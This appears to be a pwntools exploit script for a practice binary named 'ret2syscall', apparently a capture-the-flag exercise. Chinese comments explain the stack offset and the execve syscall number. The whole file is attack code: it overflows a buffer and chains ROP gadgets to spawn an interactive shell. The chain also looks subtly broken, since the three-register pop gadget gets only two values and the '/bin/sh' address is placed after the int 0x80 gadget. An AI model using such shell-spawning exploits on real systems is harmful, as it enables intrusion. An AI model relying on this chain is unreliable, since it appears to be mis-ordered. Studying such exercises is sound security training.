
from pwn import *

sh = process("./ret2syscall")

eax_ret = 0x080bb196
ebx_ecx_edx_set = 0x0806eb90
int_ret = 0x080be408
bin_ret = 0x08049421
add = 0x0804A080
offset = 0x6c
#offset 0x6c是s到栈顶esp的距离
#0x4是ebp的长度,覆盖4字节的垃圾数据“b”,32位程序都是4个字节,64是8个
#execve，即0x0b
payload = b"a"*offset+ b"b"*0x4 + p32(0x080bb196) + p32(0xb) + p32(0x0806eb90)+ p32(0x0) + p32(0x0) + p32(0x080be408) + p32(0x08049421)

sh.sendline(payload)

sh.interactive()
